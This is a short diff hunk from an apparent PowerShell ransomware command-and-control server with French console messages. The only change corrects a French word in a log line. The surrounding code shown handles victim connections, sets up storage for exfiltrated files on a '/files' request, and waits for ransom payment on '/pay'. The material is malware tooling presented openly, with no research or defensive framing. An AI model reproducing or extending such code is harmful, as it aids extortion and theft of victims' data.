@@ -146,7 +146,7 @@ if ($context.Request.HttpMethod -eq "GET") {
       Write-Host "[!] Nouvelle connexion de $($context.Request.RemoteEndPoint)" -f Red }
    
    if ($context.Request.RawUrl -eq"/files") { mkdir "C2Files" 2>&1> $null 
-      Write-Host ; Write-Host "[i] Recuperation des fichiers exfiltres et dechiffrage des fichiers.." -f Green ; sleep 2 }   
+      Write-Host ; Write-Host "[i] Recuperation des fichiers exfiltres et dechiffrement des fichiers.." -f Green ; sleep 2 }   
 
    if ($context.Request.RawUrl -eq "/pay") { Write-Host ; Write-Host "[i] En attente d'une reponse pour le paiement.." -f Green ; sleep 2
       Write-Host "[!] L'utilisateur a ete tente de payer la rancon !" -f Red }
